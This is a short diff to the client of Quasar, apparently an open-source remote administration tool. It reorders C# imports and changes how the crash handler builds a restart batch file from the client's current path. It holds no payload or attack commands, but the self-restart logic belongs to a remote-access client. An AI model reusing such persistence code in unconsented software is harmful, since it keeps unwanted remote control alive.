@@ -1,16 +1,18 @@
-﻿using System;
-using System.Diagnostics;
-using System.IO;
-using System.Threading;
-using System.Windows.Forms;
-using Quasar.Client.Commands;
+﻿using Quasar.Client.Commands;
 using Quasar.Client.Config;
 using Quasar.Client.Data;
 using Quasar.Client.Helper;
 using Quasar.Client.Installation;
+using Quasar.Client.IO;
 using Quasar.Client.Networking;
 using Quasar.Client.Utilities;
 using Quasar.Common.Cryptography;
+using Quasar.Common.Helpers;
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace Quasar.Client
 {
@@ -52,7 +54,7 @@ namespace Quasar.Client
         {
             if (e.IsTerminating)
             {
-                string batchFile = FileHelper.CreateRestartBatch();
+                string batchFile = BatchFile.CreateRestartBatch(ClientData.CurrentPath);
                 if (string.IsNullOrEmpty(batchFile)) return;
 
                 ProcessStartInfo startInfo = new ProcessStartInfo
